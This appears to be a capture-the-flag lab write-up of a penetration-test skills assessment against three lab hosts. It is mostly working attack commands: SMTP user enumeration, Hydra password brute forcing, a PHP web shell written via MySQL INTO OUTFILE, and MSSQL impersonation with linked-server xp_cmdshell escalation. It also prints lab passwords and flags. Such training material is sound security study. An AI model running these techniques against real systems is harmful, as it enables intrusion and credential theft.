# Skills Assessment

## Context
> We were commissioned by the company **Inlanefreight** to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: **HTB{...}**

## Targets (3 Hosts)

### Server 1 — Email, Customers & Files
- **Role:** Email server, customer management, file management
- **IP:** 10.129.203.7
- **OS:** Windows Server (XAMPP stack)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED

### Server 2 — Internal Email/File Server (Backup/Testing)
- **Role:** Internal server within `inlanefreight.htb` domain; manages and stores emails/files; serves as backup for company processes
- **IP:** 10.129.74.166
- **OS:** Ubuntu Linux (OpenSSH 8.2p1, Dovecot POP3, ProFTPD, BIND DNS)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED
- **Notes:** Used relatively rarely; mostly for testing purposes so far

### Server 3 — Internal File/Material Management + Unknown Database
- **Role:** Internal server used to manage files and working material (forms); database present (purpose unknown)
- **IP:** 10.129.203.10
- **OS:** Windows Server 2019 Build 17763 (XAMPP stack)
- **Hostname:** WIN-HARD
- **Domain:** WIN-HARD (standalone, not domain joined)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED

## Recon

### Nmap Scan Results
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Core FTP Server
25/tcp   open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
80/tcp   open  http          Apache/2.4.53 (XAMPP)
443/tcp  open  https         Apache/2.4.53 (Basic Auth)
587/tcp  open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP)
```

### Service Enum
- **SMTP (25/587):** hMailServer, AUTH LOGIN PLAIN enabled
- **FTP (21):** Core FTP Server, TLS enabled, no anonymous access
- **HTTP (80):** XAMPP welcome page
- **HTTPS (443):** HTTP Basic Authentication required
- **MySQL (3306):** MariaDB — potential hMailServer backend
- **RDP (3389):** Windows Terminal Services


## Exploitation
### Server 1 — Complete Attack Chain

**Phase 1: SMTP User Enumeration**
```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt \
  -D inlanefreight.htb -t 10.129.203.7
```
**Result:** `fiona@inlanefreight.htb` exists

**Phase 2: Password Brute Force (SMTP AUTH)**
```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt \
  smtp://10.129.203.7:587 -t 32
```
**Result:** `fiona@inlanefreight.htb` / `987654321`

**Phase 3: Credential Reuse & Service Access**

| Service | Credentials | Result |
|---------|-------------|--------|
| SMTP (587) | `fiona:987654321` | ✅ Valid — initial foothold |
| FTP (21) | `fiona:987654321` | ✅ Valid — data connection issues (EPSV/PASV blocked) |
| HTTP Basic Auth (443) | `fiona:987654321` | ✅ Valid — CoreFTP upload portal access |
| MySQL (3306) | `fiona:987654321` | ✅ Valid — **critical finding** |
| RDP (3389) | `fiona:987654321` | ❌ Invalid |

**Phase 4: MySQL → RCE (The Key Pivot)**

MySQL `secure_file_priv` was **empty** (`''`), allowing unrestricted file writes:
```sql
-- Verified: can write anywhere
SHOW VARIABLES LIKE "secure_file_priv";
-- Result: empty string = no restrictions

-- Write PHP web shell to Apache web root
USE test;
SELECT "<?php system(\$_GET['cmd']); ?>" 
  INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

**Phase 5: Web Shell → Reverse Shell**
```bash
# Verify RCE
curl "http://inlanefreight.htb/shell.php?cmd=whoami"
# Result: nt authority\system

# Upgrade to interactive PowerShell reverse shell
# Via web shell — download and execute PowerShell payload
```

**Phase 6: Flag Capture**
```powershell
# Located in Administrator's Desktop
cd C:\Users\Administrator\Desktop
type flag.txt
```
**Flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

### Server 2 — Complete Attack Chain

**Phase 1: Full Port Scan**
```bash
sudo nmap -sC -sV -p- -Pn -oN nmap.full.server2 10.129.74.166 -T4
```
**Critical Finding:** Port 30021/tcp — ProFTPD with **anonymous FTP access**

**Phase 2: Anonymous FTP Enumeration**
```bash
ftp -p 10.129.74.166 30021
# Login: anonymous / anonymous
# Discovered: simon/ directory with mynotes.txt
```

**Phase 3: Password Discovery**
```
mynotes.txt contents:
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

**Phase 4: SSH Brute Force**
```bash
hydra -l simon -P mynotes.txt ssh://10.129.74.166 -t 4 -vV
```
**Result:** `simon` / `8Ns8j1b!23hs4921smHzwn`

**Phase 5: Flag Capture**
```bash
ssh simon@10.129.74.166
cat flag.txt
```
**Flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

### Server 3 — Complete Attack Chain

**Phase 1: SMB Guest Access & Credential Discovery**
```bash
smbclient -L //10.129.203.10/ -N
smbclient //10.129.203.10/Home -U guest
# Downloaded from IT share:
#   IT/Fiona/creds.txt      → 5 passwords
#   IT/John/information.txt → hints: "Keep testing with the database", "Create a local linked server", "Simulate Impersonation"
#   IT/John/secrets.txt     → 5 passwords
#   IT/Simon/random.txt     → 5 passwords
```

**Phase 2: SMB Authentication Confirmed**
```bash
crackmapexec smb 10.129.203.10 -u fiona -p '48Ns72!bns74@S84NNNSl'
crackmapexec smb 10.129.203.10 -u john -p 'SecurePassword!'
```
**Result:** Both fiona and john have valid SMB credentials

**Phase 3: RDP Access (Hydra Hint → xfreerdp3)**
```bash
# Hydra RDP module (experimental) hinted at valid passwords:
# "might be valid but account not active for remote desktop"
# This means password is correct but user not in "Remote Desktop Users"
# Fiona IS in BUILTIN\Remote Desktop Users — xfreerdp3 works:
xfreerdp3 /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert:ignore
```

**Phase 4: MSSQL Windows Integrated Auth**
```bash
impacket-mssqlclient 'WIN-HARD/fiona:48Ns72!bns74@S84NNNSl@10.129.203.10' -windows-auth
```
**Enumeration:**
```sql
SELECT SYSTEM_USER;                    -- WIN-HARD\Fiona
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 (not sysadmin)
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
-- Found: IMPERSONATE on john (principal_id 272) and simon (principal_id 273)
SELECT srvname, isremote FROM sysservers;
-- Found: WINSRV02\SQLEXPRESS (remote=1), LOCAL.TEST.LINKED.SRV (remote=0)
```

**Phase 5: Linked Server Escalation (The Key Pivot)**
```sql
-- Impersonate john and query linked server
EXECUTE AS LOGIN = 'john';
SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT SYSTEM_USER');
-- Result: testadmin
SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
-- Result: 1 (SYSADMIN!)
```

**Phase 6: use_link Bracket Trick & xp_cmdshell**
```sql
-- use_link with dots in name requires brackets!
use_link [LOCAL.TEST.LINKED.SRV]
-- Prompt changes to: SQL >[LOCAL.TEST.LINKED.SRV] (testadmin dbo@master)>
enable_xp_cmdshell
xp_cmdshell whoami
-- Result: nt authority\system
xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"
-- Result: HTB{46u$!n9_l!nk3d_$3r3r$}
```

**Phase 7: Flag Capture**
```powershell
# Located in Administrator's Desktop
type C:\Users\Administrator\Desktop\flag.txt
```
**Flag:** `HTB{46u$!n9_l!nk3d_$3r3r$}`

## Flags
| Server | Host | Flag | Status |
|--------|------|------|--------|
| 1 | Email/Files | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` | ✅ **CAPTURED** |
| 2 | Internal Email/File | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` | ✅ **CAPTURED** |
| 3 | File/Material + DB | `HTB{46u$!n9_l!nk3d_$3r3r$}` | ✅ **CAPTURED** |

## Credentials Discovered

| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| `fiona@inlanefreight.htb` | `987654321` | Hydra (SMTP AUTH) | SMTP, FTP, HTTP Basic Auth, MySQL |
| `simon` | `8Ns8j1b!23hs4921smHzwn` | mynotes.txt (FTP) | SSH |
| `WIN-HARD\fiona` | `48Ns72!bns74@S84NNNSl` | creds.txt (SMB) | SMB, RDP, MSSQL (Win Auth) |
| `WIN-HARD\john` | `SecurePassword!` | secrets.txt (SMB) | SMB |
| `john` (SQL_LOGIN) | *(password unknown — used via IMPERSONATE)* | MSSQL permissions | MSSQL impersonation |
| `simon` (SQL_LOGIN) | *(password unknown — used via IMPERSONATE)* | MSSQL permissions | MSSQL impersonation |
| `testadmin` (linked server) | *(mapped from john impersonation)* | Linked server | LOCAL.TEST.LINKED.SRV (sysadmin) |

## Attack Chain Summary (Server 2)

```
Full port scan → discovered anonymous FTP on port 30021
    ↓
Anonymous FTP login → downloaded simon/mynotes.txt
    ↓
mynotes.txt contained password candidates
    ↓
Hydra SSH brute force with simon + mynotes.txt passwords
    ↓
Valid password found: 8Ns8j1b!23hs4921smHzwn
    ↓
SSH login as simon → flag.txt in home directory
    ↓
Flag captured: HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

## Attack Chain Summary (Server 3)

```
SMB guest access → download creds.txt, secrets.txt, random.txt
    ↓
Password list extracted from SMB files
    ↓
Hydra RDP brute force (unreliable module) hinted valid passwords
    ↓
xfreerdp3 confirmed fiona RDP access: 48Ns72!bns74@S84NNNSl
    ↓
MSSQL Windows Integrated Auth as fiona
    ↓
IMPERSONATE privilege on john (SQL_LOGIN 272) and simon (SQL_LOGIN 273)
    ↓
EXECUTE AS LOGIN = 'john' → query LOCAL.TEST.LINKED.SRV
    ↓
Linked server connects as testadmin (SYSADMIN!)
    ↓
use_link [LOCAL.TEST.LINKED.SRV] ← BRACKETS REQUIRED for dotted names
    ↓
enable_xp_cmdshell → xp_cmdshell whoami = nt authority\system
    ↓
Flag captured: HTB{46u$!n9_l!nk3d_$3r3r$}
```

## Lessons Learned

### Server 1
- **SMTP user enumeration** with `RCPT TO:` is reliable for discovering valid email accounts
- **Hydra against SMTP AUTH** can crack weak passwords quickly (rockyou, 32 threads)
- **Credential reuse is critical** — fiona's password worked across SMTP, FTP, HTTP, and MySQL
- **MySQL `secure_file_priv`** being empty is a **critical misconfiguration** — allows direct RCE via `INTO OUTFILE`
- **PHP shells in web root** give immediate SYSTEM privileges on Windows XAMPP (runs as SYSTEM)
- **FTP passive/active mode issues** are common — don't get stuck; pivot to other vectors (MySQL was the key)
- **Web upload forms** may have PHP execution disabled in uploads directory — always check if you can write to web root instead

### Server 2
- **Full port scans matter** — the initial nmap missed port 30021 (anonymous FTP)
- **Anonymous FTP is still a thing** — always check, even on "modern" systems
- **User directories in anonymous FTP** are goldmines — often contain notes, configs, or password hints
- **Password lists in user files** — `mynotes.txt` was literally a password list for the user
- **SSH brute force with small wordlists** is fast and effective when you have context (8 passwords, instant result)
- **POP3 catch-all configuration** (accepting any USER) prevents user enumeration — pivot to other services
- **DNS zone transfers** reveal network topology but don't directly lead to compromise — combine with other vectors

### Server 3
- **SMB guest access** can reveal credential files even when anonymous/null is denied
- **Files named `information.txt`** often contain direct hints from lab designers — read them carefully
- **Hydra RDP module is experimental/unreliable** — "might be valid but account not active for remote desktop" actually means **password is correct**
- **MSSQL IMPERSONATE privilege** is a powerful escalation path — always check `sys.server_permissions`
- **Linked servers** can bypass local privilege restrictions — `LOCAL.TEST.LINKED.SRV` mapped john to testadmin (sysadmin)
- **`use_link` with dotted names requires brackets** — `use_link [LOCAL.TEST.LINKED.SRV]` works, `use_link LOCAL.TEST.LINKED.SRV` fails
- **xp_cmdshell on linked server** runs as the linked server service account — often `nt authority\system`
- **Never trust filenames with "OLD"** — this pattern held true from Password Attacks assessment too
- **RDP group membership** (`BUILTIN\Remote Desktop Users`) is separate from password validity — check both

### Tools Used
- `smtp-user-enum` — SMTP user enumeration
- `hydra` — SMTP AUTH brute force, SSH brute force, RDP brute force (hint only)
- `mysql` client — MySQL access with `--skip-ssl`
- `curl` — web shell interaction
- `nc` — reverse shell listener
- `ftp` — anonymous FTP access
- `nmap` — full port scanning
- `dig` — DNS zone transfer
- `smbclient` / `crackmapexec smb` — SMB enumeration and auth testing
- `impacket-mssqlclient` — MSSQL Windows Integrated Auth, linked server exploitation
- `xfreerdp3` — RDP connection

---

*Updated: 2026-04-22 23:23 UTC+8*
*Server 1 Status: ✅ COMPROMISED*
*Server 2 Status: ✅ COMPROMISED*
*Server 3 Status: ✅ COMPROMISED*
*Assessment Status: 🏆 COMPLETE — All 3 flags captured*
